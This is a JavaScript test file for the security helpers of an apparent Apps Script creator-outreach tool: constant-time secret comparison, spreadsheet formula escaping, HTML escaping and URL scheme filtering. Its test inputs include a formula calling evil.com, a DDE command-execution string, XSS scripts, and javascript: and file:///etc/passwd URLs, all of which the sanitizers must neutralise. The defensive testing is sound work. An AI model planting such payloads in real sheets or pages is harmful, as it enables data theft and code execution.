import test from "node:test";
import assert from "node:assert/strict";

function constantTimeCompare(a, b) {
  if (typeof a !== "string" || typeof b !== "string") {
    return false;
  }
  var lenA = a.length;
  var lenB = b.length;
  var diff = lenA ^ lenB;
  var maxLen = Math.max(lenA, lenB);
  for (var i = 0; i < maxLen; i++) {
    var charA = i < lenA ? a.charCodeAt(i) : 0;
    var charB = i < lenB ? b.charCodeAt(i) : 0;
    diff |= charA ^ charB;
  }
  return diff === 0;
}

function sanitizeForSheet(val) {
  if (val === null || val === undefined) return "";
  var str = String(val).replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, "");
  var trimmed = str.trim();
  if (!trimmed) return "";
  
  if (/^[=+\-@\t\r]/.test(str) || /^[=+\-@]/.test(trimmed)) {
    return "'" + trimmed;
  }
  return trimmed;
}

function escapeHtml(val) {
  if (val === null || val === undefined) return "";
  return String(val)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function sanitizeUrl(rawUrl) {
  if (!rawUrl || typeof rawUrl !== "string") return "#";
  var trimmed = rawUrl.trim();
  
  if (trimmed.startsWith("@")) {
    var handle = trimmed.substring(1).replace(/[^a-zA-Z0-9_.]/g, "");
    return "https://instagram.com/" + handle;
  }
  
  var schemeMatch = trimmed.match(/^([a-zA-Z0-9+.-]+):/);
  if (schemeMatch) {
    var scheme = schemeMatch[1].toLowerCase();
    if (scheme !== "http" && scheme !== "https") {
      return "#";
    }
    return trimmed;
  }
  
  if (/^[a-zA-Z0-9]/.test(trimmed)) {
    return "https://" + trimmed;
  }
  
  return "#";
}

test("Apps Script Security: Timing-Safe Secret Verification", () => {
  const secret = "SUPER_SECURE_RANDOM_TOKEN_123456";
  assert.equal(constantTimeCompare(secret, secret), true);
  assert.equal(constantTimeCompare(secret, "WRONG_SECRET"), false);
  assert.equal(constantTimeCompare(secret, ""), false);
  assert.equal(constantTimeCompare(secret, null), false);
  assert.equal(constantTimeCompare(secret, undefined), false);
  assert.equal(constantTimeCompare("", ""), true);
});

test("Apps Script Security: Formula Injection Protection (sanitizeForSheet)", () => {
  assert.equal(sanitizeForSheet("=IMPORTXML('http://evil.com')"), "'=IMPORTXML('http://evil.com')");
  assert.equal(sanitizeForSheet("+cmd|' /C calc'!A0"), "'+cmd|' /C calc'!A0");
  assert.equal(sanitizeForSheet("-SUM(1, 2)"), "'-SUM(1, 2)");
  assert.equal(sanitizeForSheet("@SUM(A1:A10)"), "'@SUM(A1:A10)");
  assert.equal(sanitizeForSheet("\t=2+5"), "'=2+5");
  assert.equal(sanitizeForSheet("\r=ALERT()"), "'=ALERT()");

  assert.equal(sanitizeForSheet("Valid Name"), "Valid Name");
  assert.equal(sanitizeForSheet("Kochi, Kerala"), "Kochi, Kerala");
  assert.equal(sanitizeForSheet("https://instagram.com/creator"), "https://instagram.com/creator");
  assert.equal(sanitizeForSheet(null), "");
  assert.equal(sanitizeForSheet(undefined), "");
});

test("Apps Script Security: HTML Email Escaping (escapeHtml)", () => {
  assert.equal(escapeHtml("<script>alert(\"XSS\")</script>"), "&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;");
  assert.equal(escapeHtml("Creator & Co. 'Special'"), "Creator &amp; Co. &#39;Special&#39;");
  assert.equal(escapeHtml(null), "");
  assert.equal(escapeHtml(undefined), "");
});

test("Apps Script Security: URL Sanitization (sanitizeUrl)", () => {
  assert.equal(sanitizeUrl("javascript:alert(document.cookie)"), "#");
  assert.equal(sanitizeUrl("data:text/html,<script>alert(1)</script>"), "#");
  assert.equal(sanitizeUrl("vbscript:msgbox(1)"), "#");
  assert.equal(sanitizeUrl("file:///etc/passwd"), "#");

  assert.equal(sanitizeUrl("https://instagram.com/myhandle"), "https://instagram.com/myhandle");
  assert.equal(sanitizeUrl("http://brandwebsite.com"), "http://brandwebsite.com");
  assert.equal(sanitizeUrl("@my_creator_handle"), "https://instagram.com/my_creator_handle");
  assert.equal(sanitizeUrl("instagram.com/test"), "https://instagram.com/test");
});
